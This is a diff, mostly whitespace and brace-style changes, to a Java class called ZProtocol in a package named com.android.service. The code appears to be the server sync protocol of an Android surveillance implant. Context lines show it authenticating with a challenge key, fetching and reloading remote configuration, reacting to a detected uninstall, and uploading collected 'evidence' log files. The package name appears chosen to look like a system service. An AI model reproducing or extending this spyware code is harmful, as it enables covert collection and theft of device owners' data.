@@ -37,7 +37,6 @@ import com.android.service.util.WChar;
  * The Class ZProtocol.
  */
 public class ZProtocol extends Protocol {
-
 	/** The debug. */
 	private static final String TAG = "ZProtocol"; //$NON-NLS-1$
 	/** The Constant SHA1LEN. */
@@ -67,6 +66,7 @@ public class ZProtocol extends Protocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (ZProtocol): " + e); //$NON-NLS-1$
 			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e);
 			}
@@ -98,6 +98,7 @@ public class ZProtocol extends Protocol {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Warn: " + "Uninstall detected, no need to continue"); //$NON-NLS-1$ //$NON-NLS-2$
 				}
+
 				return true;
 			}
 
@@ -117,16 +118,19 @@ public class ZProtocol extends Protocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
+			
 			return false;
 		} catch (final ProtocolException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
+			
 			return false;
 		} catch (final CommandException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
+			
 			return false;
 		} finally {
 			transport.close();
@@ -146,13 +150,14 @@ public class ZProtocol extends Protocol {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: ***** Authentication *****"); //$NON-NLS-1$
 		}
+		
 		// key init
 		cryptoConf.makeKey(Keys.self().getChallengeKey());
 
 		random.nextBytes(Kd);
 		random.nextBytes(Nonce);
-		final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
 
+		final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
 		final byte[] response = transport.command(cypherOut);
 
 		return parseAuthentication(response);
@@ -171,8 +176,10 @@ public class ZProtocol extends Protocol {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: ***** Identification *****"); //$NON-NLS-1$
 		}
+		
 		final byte[] response = command(Proto.ID, forgeIdentification());
 		final boolean[] capabilities = parseIdentification(response);
+		
 		return capabilities;
 	}
 
@@ -203,19 +210,18 @@ public class ZProtocol extends Protocol {
 				} else {
 					data = Utils.intToByteArray(Proto.NO);
 				}
-				
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (newConf): sending conf answer: " + ret);
 				}
 				command(Proto.NEW_CONF, data);
 
-			}else{
+			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (newConf): no conf, no need to write another message");
 				}
 			}
-			
-			
+
 		}
 	}
 
@@ -590,21 +596,21 @@ public class ZProtocol extends Protocol {
 						Check.log(TAG + " (parseNewConf): RELOADING"); //$NON-NLS-1$
 					}
 					// status.reload = true;
-					ret = Core.getInstance().reloadConf();					
-				}else{
+					ret = Core.getInstance().reloadConf();
+				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (parseNewConf): ERROR RELOADING"); //$NON-NLS-1$
 					}
 				}
-				
+
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error (parseNewConf): empty conf"); //$NON-NLS-1$
 				}
 			}
-			if(ret){
+			if (ret) {
 				return Proto.OK;
-			}else{
+			} else {
 				return Proto.ERROR;
 			}
 
@@ -886,13 +892,13 @@ public class ZProtocol extends Protocol {
 					continue;
 				}
 				final byte[] content = file.read();
-				if(content==null){
+				if (content == null) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " Error: File is empty: " + fullLogName); //$NON-NLS-1$
 					}
 					continue;
 				}
-				
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Info: Sending file: " + EvidenceCollector.decryptName(logName)); //$NON-NLS-1$
 				}
